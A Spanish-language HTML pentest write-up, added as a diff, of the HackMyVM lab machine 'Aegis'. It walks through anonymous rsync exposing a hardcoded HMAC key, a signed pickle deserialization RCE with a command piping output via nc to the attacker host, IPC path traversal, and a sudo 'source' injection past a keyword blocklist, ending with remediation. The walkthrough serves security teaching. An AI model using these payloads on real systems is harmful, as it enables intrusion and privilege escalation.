@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aegis · 192.168.1.25</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#070a12; --bg2:#0b1020; --panel:#10151f; --panel2:#151c2a;
+    --border:#1f2a3d; --border2:#2a3850;
+    --fg:#dbe4f0; --muted:#8a97ab; --dim:#5a6678;
+    --accent:#6ea8ff; --accent2:#b98cff; --cyan:#38e0d0; --pink:#ff6ad5;
+    --ok:#4ade80; --warn:#fbbf24; --crit:#ff5a6e;
+    --mono:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace;
+    --sans:'Space Grotesk',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+    --glow:0 0 40px -10px var(--accent);
+  }
+  @media (prefers-color-scheme: light){
+    :root:not([data-theme="dark"]){
+      --bg:#eef2f8; --bg2:#e6ecf5; --panel:#ffffff; --panel2:#f4f7fc;
+      --border:#d8e0ec; --border2:#c4d0e2;
+      --fg:#16202e; --muted:#53627a; --dim:#8a97ab;
+      --accent:#2f6bff; --accent2:#8b50f0; --cyan:#0aa39a; --pink:#d6349c;
+      --ok:#15a349; --warn:#b47600; --crit:#e02637;
+      --glow:0 0 40px -14px var(--accent);
+    }
+  }
+  :root[data-theme="dark"]{
+    --bg:#070a12; --bg2:#0b1020; --panel:#10151f; --panel2:#151c2a;
+    --border:#1f2a3d; --fg:#dbe4f0; --muted:#8a97ab;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{margin:0;background:var(--bg);color:var(--fg);font-family:var(--sans);
+    line-height:1.65;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+
+  /* ---------- animated background ---------- */
+  .bgfx{position:fixed;inset:0;z-index:-2;overflow:hidden;background:var(--bg)}
+  .blob{position:absolute;border-radius:50%;filter:blur(80px);opacity:.5;
+    mix-blend-mode:screen;animation:drift 22s ease-in-out infinite}
+  @media (prefers-color-scheme:light){.blob{opacity:.28;mix-blend-mode:multiply}}
+  .blob.a{width:50vw;height:50vw;background:radial-gradient(circle,var(--accent),transparent 60%);top:-12%;left:-8%}
+  .blob.b{width:46vw;height:46vw;background:radial-gradient(circle,var(--accent2),transparent 60%);top:22%;right:-12%;animation-delay:-6s}
+  .blob.c{width:40vw;height:40vw;background:radial-gradient(circle,var(--cyan),transparent 60%);bottom:-14%;left:18%;animation-delay:-12s}
+  @keyframes drift{0%,100%{transform:translate(0,0) scale(1)}33%{transform:translate(6vw,4vh) scale(1.12)}66%{transform:translate(-5vw,-3vh) scale(.92)}}
+  .grid{position:fixed;inset:0;z-index:-1;pointer-events:none;
+    background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+    background-size:46px 46px;opacity:.22;mask-image:radial-gradient(ellipse 80% 60% at 50% 0%,#000 30%,transparent 75%)}
+
+  /* ---------- progress bar ---------- */
+  .progress{position:fixed;top:0;left:0;height:3px;width:0;z-index:50;
+    background:linear-gradient(90deg,var(--accent),var(--accent2),var(--cyan));
+    box-shadow:0 0 12px var(--accent)}
+
+  .wrap{max-width:1000px;margin:0 auto;padding:0 20px 100px}
+
+  /* ---------- hero ---------- */
+  header{min-height:92vh;display:flex;flex-direction:column;justify-content:center;
+    padding:60px 0 40px;position:relative}
+  .eyebrow{font-family:var(--mono);font-size:.82rem;letter-spacing:3px;text-transform:uppercase;
+    color:var(--cyan);margin-bottom:18px;opacity:0;animation:fadeUp .7s .1s forwards}
+  h1{font-size:clamp(3rem,11vw,7rem);line-height:.92;margin:0;font-weight:700;letter-spacing:-2px;
+    background:linear-gradient(120deg,var(--fg) 20%,var(--accent) 55%,var(--accent2) 85%);
+    -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
+    opacity:0;animation:fadeUp .8s .2s forwards}
+  .ip{font-family:var(--mono);font-size:clamp(1rem,3.5vw,1.6rem);color:var(--muted);
+    margin-top:14px;opacity:0;animation:fadeUp .8s .35s forwards}
+  .ip b{color:var(--cyan)}
+  .pills{display:flex;flex-wrap:wrap;gap:10px;margin-top:30px;opacity:0;animation:fadeUp .8s .5s forwards}
+  .pill{font-family:var(--mono);font-size:.8rem;padding:7px 15px;border-radius:30px;
+    background:var(--panel);border:1px solid var(--border2);color:var(--muted);
+    backdrop-filter:blur(8px)}
+  .pill b{color:var(--fg)}
+  .pill.win{border-color:var(--ok);color:var(--ok)}
+  .pill.win b{color:var(--ok)}
+  .scrolldown{margin-top:48px;font-family:var(--mono);font-size:.78rem;color:var(--dim);
+    letter-spacing:2px;opacity:0;animation:fadeUp .8s .7s forwards}
+  .scrolldown span{display:inline-block;animation:bob 1.8s ease-in-out infinite}
+  @keyframes bob{0%,100%{transform:translateY(0)}50%{transform:translateY(6px)}}
+
+  /* ---------- flags hero ---------- */
+  .flags{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:44px}
+  @media(max-width:620px){.flags{grid-template-columns:1fr}}
+  .flagcard{position:relative;padding:20px 22px;border-radius:16px;overflow:hidden;
+    background:var(--panel);border:1px solid var(--border2);
+    opacity:0;animation:fadeUp .8s forwards}
+  .flagcard.u{animation-delay:.55s}
+  .flagcard.r{animation-delay:.68s}
+  .flagcard::before{content:"";position:absolute;inset:0;padding:1px;border-radius:16px;
+    background:linear-gradient(130deg,var(--accent),transparent 40%,transparent 60%,var(--accent2));
+    -webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
+    -webkit-mask-composite:xor;mask-composite:exclude;opacity:.8}
+  .flagcard .lbl{font-family:var(--mono);font-size:.72rem;letter-spacing:2px;text-transform:uppercase;color:var(--muted)}
+  .flagcard .val{font-family:var(--mono);font-size:clamp(.82rem,2.4vw,1.05rem);font-weight:700;margin-top:8px;
+    color:var(--ok);word-break:break-all;text-shadow:0 0 18px color-mix(in srgb,var(--ok) 45%,transparent)}
+  .flagcard .big{font-size:2.4rem;line-height:1;margin-bottom:6px}
+
+  /* ---------- reveal ---------- */
+  .reveal{opacity:0;transform:translateY(28px);transition:opacity .7s cubic-bezier(.2,.7,.2,1),transform .7s cubic-bezier(.2,.7,.2,1)}
+  .reveal.in{opacity:1;transform:none}
+
+  section{margin-top:40px}
+  h2{font-size:clamp(1.5rem,4.5vw,2.1rem);font-weight:700;letter-spacing:-.5px;margin:0 0 6px;
+    display:flex;align-items:center;gap:14px}
+  h2 .num{font-family:var(--mono);font-size:1rem;color:var(--bg);background:linear-gradient(135deg,var(--accent),var(--accent2));
+    width:40px;height:40px;border-radius:11px;display:flex;align-items:center;justify-content:center;flex:0 0 auto;
+    box-shadow:var(--glow);font-weight:700}
+  .lead{color:var(--muted);margin:0 0 20px;font-size:1.05rem}
+
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:16px;padding:22px 24px;margin:16px 0}
+  .card h3{color:var(--accent2);margin:18px 0 8px;font-size:1.05rem}
+  .card h3:first-child{margin-top:0}
+  p{margin:10px 0}
+
+  /* severity badge */
+  .sev{font-family:var(--mono);font-size:.68rem;font-weight:700;letter-spacing:1px;text-transform:uppercase;
+    padding:4px 10px;border-radius:7px;flex:0 0 auto}
+  .sev.crit{color:var(--crit);background:color-mix(in srgb,var(--crit) 14%,transparent);border:1px solid var(--crit)}
+  .sev.high{color:var(--warn);background:color-mix(in srgb,var(--warn) 14%,transparent);border:1px solid var(--warn)}
+
+  /* ---------- terminal code ---------- */
+  .term{background:#05080f;border:1px solid var(--border2);border-radius:12px;margin:16px 0;overflow:hidden;
+    box-shadow:0 20px 50px -30px #000}
+  :root:not([data-theme="dark"]) .term{background:#0c1018}
+  .term .bar{display:flex;align-items:center;gap:7px;padding:10px 14px;background:rgba(255,255,255,.03);border-bottom:1px solid var(--border)}
+  .term .dot{width:11px;height:11px;border-radius:50%}
+  .term .dot.r{background:#ff5f56}.term .dot.y{background:#ffbd2e}.term .dot.g{background:#27c93f}
+  .term .title{margin-left:8px;font-family:var(--mono);font-size:.74rem;color:var(--dim)}
+  .term pre{margin:0;padding:16px 18px;overflow-x:auto;font-family:var(--mono);font-size:.84rem;line-height:1.55;color:#cbd6e8}
+  :root:not([data-theme="dark"]) .term pre{color:#2a3650}
+  .term .c{color:var(--cyan)}         /* command / prompt */
+  .term .o{color:var(--muted)}        /* output */
+  .term .k{color:var(--pink)}         /* key / highlight */
+  .term .g{color:var(--ok)}           /* success */
+  .term .m{color:var(--accent2)}      /* comment */
+
+  code{font-family:var(--mono);font-size:.86em;background:var(--panel2);padding:2px 7px;border-radius:5px;color:var(--cyan);border:1px solid var(--border)}
+
+  /* ---------- attack chain ---------- */
+  .chain{position:relative;margin:28px 0;padding-left:8px}
+  .chain .line{position:absolute;left:27px;top:12px;bottom:12px;width:2px;
+    background:linear-gradient(var(--accent),var(--accent2),var(--cyan));
+    transform-origin:top;transform:scaleY(0);transition:transform 1.1s ease}
+  .chain.in .line{transform:scaleY(1)}
+  .step{position:relative;padding:0 0 26px 62px;min-height:48px}
+  .step .node{position:absolute;left:12px;top:0;width:34px;height:34px;border-radius:50%;
+    display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-weight:700;
+    background:var(--panel);border:2px solid var(--accent);color:var(--accent);z-index:1;
+    opacity:0;transform:scale(.4);transition:all .5s cubic-bezier(.2,1.4,.4,1)}
+  .chain.in .step .node{opacity:1;transform:none}
+  .step:nth-child(2) .node{transition-delay:.15s}
+  .step:nth-child(3) .node{transition-delay:.35s}
+  .step:nth-child(4) .node{transition-delay:.55s}
+  .step:nth-child(5) .node{transition-delay:.75s}
+  .step.win .node{border-color:var(--ok);color:var(--ok);box-shadow:0 0 18px color-mix(in srgb,var(--ok) 50%,transparent)}
+  .step h4{margin:4px 0 3px;font-size:1.05rem}
+  .step p{margin:0;color:var(--muted);font-size:.93rem}
+  .step .who{font-family:var(--mono);font-size:.76rem;color:var(--cyan)}
+  .step.win .who{color:var(--ok)}
+
+  /* ---------- tables ---------- */
+  table{width:100%;border-collapse:collapse;margin:14px 0;font-size:.92rem}
+  th,td{text-align:left;padding:11px 14px;border-bottom:1px solid var(--border)}
+  th{font-family:var(--mono);color:var(--muted);font-size:.74rem;text-transform:uppercase;letter-spacing:1px}
+  tbody tr{transition:background .2s}
+  tbody tr:hover{background:var(--panel2)}
+  td code{font-size:.82em}
+
+  .fix{display:flex;gap:14px;align-items:flex-start;padding:14px 16px;margin:12px 0;border-radius:12px;
+    background:var(--panel2);border:1px solid var(--border);border-left:3px solid var(--ok)}
+  .fix .i{color:var(--ok);font-size:1.3rem;flex:0 0 auto;line-height:1.3}
+  .fix b{color:var(--fg)}
+
+  .diag{font-family:var(--mono);font-size:.84rem;line-height:1.9;color:var(--muted);white-space:pre;overflow-x:auto;
+    background:#05080f;border:1px solid var(--border2);border-radius:12px;padding:18px 20px;margin:16px 0}
+  :root:not([data-theme="dark"]) .diag{background:#0c1018}
+  .diag .k{color:var(--cyan)}.diag .g{color:var(--ok)}
+
+  footer{margin-top:60px;padding:26px 0;border-top:1px solid var(--border);color:var(--dim);font-size:.84rem;text-align:center}
+  footer code{font-size:.8em}
+
+  @keyframes fadeUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:none}}
+
+  @media (prefers-reduced-motion:reduce){
+    *,*::before{animation:none!important;transition:none!important}
+    .reveal{opacity:1;transform:none}
+    .chain .line{transform:scaleY(1)}
+    .chain .step .node{opacity:1;transform:none}
+    .eyebrow,h1,.ip,.pills,.scrolldown,.flagcard{opacity:1;animation:none}
+    html{scroll-behavior:auto}
+  }
+</style>
+</head>
+<body>
+<div class="bgfx"><div class="blob a"></div><div class="blob b"></div><div class="blob c"></div></div>
+<div class="grid"></div>
+<div class="progress" id="prog"></div>
+
+<div class="wrap">
+
+<header>
+  <div class="eyebrow">// Pentest Report · HackMyVM</div>
+  <h1>AEGIS</h1>
+  <div class="ip">target <b>192.168.1.25</b> · Ubuntu · OpenSSH 10.2p1</div>
+  <div class="pills">
+    <span class="pill"><b>22</b> ssh</span>
+    <span class="pill"><b>873</b> rsync</span>
+    <span class="pill"><b>65432</b> aegis-proto</span>
+    <span class="pill win"><b>✔</b> Root obtenido</span>
+  </div>
+
+  <div class="flags">
+    <div class="flagcard u">
+      <div class="big">🏁</div>
+      <div class="lbl">User flag · adrian</div>
+      <div class="val">HMV{14e1fbea8f8a571b7dff473d102521dd}</div>
+    </div>
+    <div class="flagcard r">
+      <div class="big">👑</div>
+      <div class="lbl">Root flag</div>
+      <div class="val">HMV{ca323257ea9f900f5e38fefa0ccabcd6}</div>
+    </div>
+  </div>
+
+  <div class="scrolldown"><span>↓ scroll · la cadena completa</span></div>
+</header>
+
+<figure id="maquina-completada" style="margin:0 0 40px;scroll-margin-top:24px">
+  <a href="aegis-completada.png" target="_blank" rel="noopener" aria-label="Abrir la captura de Aegis completada a tamaño completo">
+    <img src="aegis-completada.png" alt="Aegis completada en HackMyVM" width="1956" height="1198" loading="lazy" style="display:block;width:100%;height:auto;border:1px solid var(--border2);border-radius:16px">
+  </a>
+  <figcaption style="margin-top:10px;color:var(--muted);font-family:var(--mono);font-size:.8rem">Aegis completada en HackMyVM · Pulsa la imagen para ampliarla.</figcaption>
+  <p style="margin-top:12px"><a href="https://hackmyvm.eu/machine/Aegis" target="_blank" rel="noopener noreferrer" style="color:var(--cyan)">🔗 Abrir la máquina Aegis en HackMyVM ↗</a></p>
+</figure>
+
+<!-- 1 RECON -->
+<section class="reveal">
+  <h2><span class="num">1</span> Reconocimiento</h2>
+  <p class="lead">Host vivo (TTL 64 → Linux). Tres servicios; rsync y el daemon propietario son los interesantes.</p>
+  <div class="term">
+    <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="title">nmap</span></div>
+    <pre><span class="c">$ nmap -p- --min-rate 3000 -T4 -Pn 192.168.1.25</span>
+<span class="o">22/tcp    open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.6</span>
+<span class="o">873/tcp   open  rsync   (protocol version 32)</span>
+<span class="o">65432/tcp open  unknown</span>
+<span class="m">|  AEGIS CORE TELEMETRY NODE — AegisProto/2.4 (HMAC-SHA256)</span></pre>
+  </div>
+</section>
+
+<!-- 2 RSYNC -->
+<section class="reveal">
+  <h2><span class="num">2</span> Fuga de info · rsync anónimo <span class="sev high">High</span></h2>
+  <p class="lead">El módulo <code>backup</code> es accesible sin credenciales y trae el cliente con su repo <code>.git</code>.</p>
+  <div class="term">
+    <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="title">rsync + git</span></div>
+    <pre><span class="c">$ rsync --list-only rsync://192.168.1.25/</span>
+<span class="o">backup   Aegis Core Deployment and Client Utilities</span>
+
+<span class="c">$ rsync -av rsync://192.168.1.25/backup/ loot/</span>
+<span class="o">README.txt   aegis-client-v2.1.tar.gz</span>
+
+<span class="c">$ git log --oneline --all</span>
+<span class="o">b56146a Security: remove hardcoded HMAC secret key   </span><span class="m"># ← demasiado tarde</span>
+<span class="o">6db9a8e Initial release</span>
+
+<span class="c">$ git show b56146a</span>
+<span class="k">- HMAC_SECRET = b"Aeg1s-C0r3-P4ck3t-S1gn-2026!"</span>
+<span class="o">+ HMAC_SECRET = os.environ.get("AEGIS_SECRET_KEY","").encode()</span></pre>
+  </div>
+  <div class="card">
+    <h3>🔑 Material recuperado</h3>
+    <p>Clave HMAC: <code>Aeg1s-C0r3-P4ck3t-S1gn-2026!</code> · El cliente revela <code>import pickle</code> y el formato de trama <code>[4B len][32B HMAC-SHA256][pickle]</code>.</p>
+  </div>
+</section>
+
+<!-- 3 RCE -->
+<section class="reveal">
+  <h2><span class="num">3</span> RCE · deserialización pickle <span class="sev crit">Critical</span></h2>
+  <p class="lead">El daemon verifica el HMAC y luego hace <code>pickle.loads()</code>. Con la clave, un objeto con <code>__reduce__</code> ejecuta comandos al deserializarse.</p>
+  <div class="term">
+    <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="title">aegis_rce.py</span></div>
+    <pre><span class="m">class RCE:</span>
+    <span class="m">def __reduce__(self):</span>
+        <span class="o">return (os.system, (cmd,))</span>
+
+<span class="o">payload = pickle.dumps(RCE())</span>
+<span class="o">sig     = hmac.new(HMAC_SECRET, payload, sha256).digest()</span>
+<span class="o">packet  = struct.pack("!I", len(payload)) + sig + payload</span>  <span class="m"># HMAC válido ⇒ deserializa</span></pre>
+  </div>
+  <div class="term">
+    <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="title">proof</span></div>
+    <pre><span class="c">$ python3 aegis_rce.py 192.168.1.25 65432 'id | nc -w3 192.168.1.30 4445'</span>
+<span class="o">[+] Authentication successful. Deserializing command packet...</span>
+<span class="g">uid=1001(operator) gid=37(operator) groups=37(operator)</span></pre>
+  </div>
+  <p>→ Ejecución de código como <b>operator</b>. Su README apunta al socket <code>/run/netmon/netmon.sock</code>.</p>
+</section>
+
+<!-- 4 ADRIAN -->
+<section class="reveal">
+  <h2><span class="num">4</span> operator → adrian · path traversal IPC <span class="sev crit">Critical</span></h2>
+  <p class="lead">El servicio NetMon corre como <b>adrian</b>, acepta <code>RUN &lt;script&gt;</code> y valida la ruta con <code>startswith("/opt/scripts/")</code> — evadible con <code>../</code>.</p>
+  <div class="term">
+    <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="title">netmon_service.py — el fallo</span></div>
+    <pre><span class="o">if not script_path.startswith(ALLOWED_DIR):</span>   <span class="m"># no resuelve la ruta real</span>
+    <span class="o">deny()</span>
+<span class="o">subprocess.run(["/bin/bash", script_path])</span>       <span class="m"># corre como adrian</span></pre>
+  </div>
+  <div class="term">
+    <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="title">explotación</span></div>
+    <pre><span class="o"># payload en /dev/shm (escribible por operator), traversal por el socket:</span>
+<span class="c">RUN /opt/scripts/../../dev/shm/.m.sh</span>
+<span class="o">[*] Executing ... under UID 1002...</span>
+<span class="g">uid=1002(adrian) groups=1002(adrian),37(operator)</span>
+<span class="g">HMV{14e1fbea8f8a571b7dff473d102521dd}</span>  <span class="m"># 🏁 user.txt</span></pre>
+  </div>
+</section>
+
+<!-- 5 ROOT -->
+<section class="reveal">
+  <h2><span class="num">5</span> adrian → root · inyección vía <code>source</code> <span class="sev crit">Critical</span></h2>
+  <p class="lead"><code>adrian</code> tiene <code>sudo NOPASSWD</code> sobre <code>aegis-backup</code>, que hace <code>source</code> de la config tras una lista negra de palabras trivialmente evitable.</p>
+  <div class="term">
+    <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="title">aegis-backup — el fallo</span></div>
+    <pre><span class="o">FORBIDDEN='(bash|sh|nc|python|perl|eval|exec|sudo|chmod|chown|rm|mkfifo)'</span>
+<span class="o">grep -qE "$FORBIDDEN" "$CONFIG" && exit 1</span>
+<span class="k">source "$CONFIG"</span>                 <span class="m"># ejecuta bash arbitrario como root</span></pre>
+  </div>
+  <div class="term">
+    <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="title">config que pasa el filtro → root</span></div>
+    <pre><span class="o">id</span>
+<span class="o">cat /root/root.txt</span>
+<span class="o">TARGET_DIR=/tmp</span>
+<span class="o">OUTPUT_FILE=/dev/null</span>   <span class="m"># ojo: evitar "sh" → nada de /dev/shm en el config</span>
+
+<span class="c">$ sudo /usr/local/bin/aegis-backup -c /tmp/.cfg</span>
+<span class="g">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="g">HMV{ca323257ea9f900f5e38fefa0ccabcd6}</span>  <span class="m"># 👑 root.txt</span></pre>
+  </div>
+</section>
+
+<!-- CHAIN -->
+<section class="reveal">
+  <h2><span class="num">★</span> Cadena de ataque</h2>
+  <div class="chain" id="chain">
+    <div class="line"></div>
+    <div class="step"><div class="node">1</div><h4>rsync anónimo <span class="who">· public</span></h4><p>Módulo <code>backup</code> → repo <code>.git</code> → clave HMAC hardcodeada.</p></div>
+    <div class="step"><div class="node">2</div><h4>pickle RCE (65432) <span class="who">→ operator</span></h4><p>Objeto firmado con la clave; <code>__reduce__</code> → <code>os.system</code>.</p></div>
+    <div class="step win"><div class="node">3</div><h4>path traversal IPC <span class="who">→ adrian · 🏁 user</span></h4><p><code>startswith</code> evadido con <code>../</code> en el socket NetMon.</p></div>
+    <div class="step win"><div class="node">★</div><h4>sudo source-injection <span class="who">→ root · 👑 root</span></h4><p>Lista negra de palabras evitable en el config que se hace <code>source</code>.</p></div>
+  </div>
+</section>
+
+<!-- REMEDIATION -->
+<section class="reveal">
+  <h2><span class="num">✓</span> Remediación</h2>
+  <div class="fix"><span class="i">◆</span><div><b>rsync:</b> deshabilitar módulos anónimos (<code>auth users</code>, <code>hosts allow</code>) y no empaquetar <code>.git</code>. <b>Rotar</b> la clave HMAC: sigue viva en el histórico.</div></div>
+  <div class="fix"><span class="i">◆</span><div><b>pickle:</b> no deserializar datos de red con <code>pickle</code>; usar JSON/MessagePack. El HMAC autentica, pero no frena un payload malicioso correctamente firmado.</div></div>
+  <div class="fix"><span class="i">◆</span><div><b>Socket IPC:</b> validar con <code>os.path.realpath()</code> + <code>commonpath</code>, o mejor allow-list de nombres — nunca comparación de prefijo.</div></div>
+  <div class="fix"><span class="i">◆</span><div><b>sudo/backup:</b> nunca hacer <code>source</code> de ficheros controlables; parsear <code>clave=valor</code> con un lector estricto. Las listas negras de palabras no son una frontera de seguridad.</div></div>
+</section>
+
+<footer>
+  Pentest autorizado · <b>Aegis</b> (192.168.1.25) · HackMyVM<br>
+  user <code>HMV{14e1fbea8f8a571b7dff473d102521dd}</code> · root <code>HMV{ca323257ea9f900f5e38fefa0ccabcd6}</code>
+</footer>
+
+</div>
+
+<script>
+  // progress bar
+  const prog = document.getElementById('prog');
+  const onScroll = () => {
+    const h = document.documentElement;
+    const p = h.scrollTop / (h.scrollHeight - h.clientHeight);
+    prog.style.width = (p*100) + '%';
+  };
+  addEventListener('scroll', onScroll, {passive:true}); onScroll();
+
+  // reveal on scroll
+  const io = new IntersectionObserver((entries)=>{
+    entries.forEach(e=>{
+      if(e.isIntersecting){
+        e.target.classList.add('in');
+        if(e.target.id==='chain') return; // keep observing handled below
+        io.unobserve(e.target);
+      }
+    });
+  },{threshold:.15});
+  document.querySelectorAll('.reveal').forEach(el=>io.observe(el));
+
+  // chain line + nodes
+  const chain = document.getElementById('chain');
+  if(chain){
+    new IntersectionObserver((es,ob)=>{
+      es.forEach(e=>{ if(e.isIntersecting){ chain.classList.add('in'); ob.disconnect(); }});
+    },{threshold:.3}).observe(chain);
+  }
+</script>
+</body>
+</html>
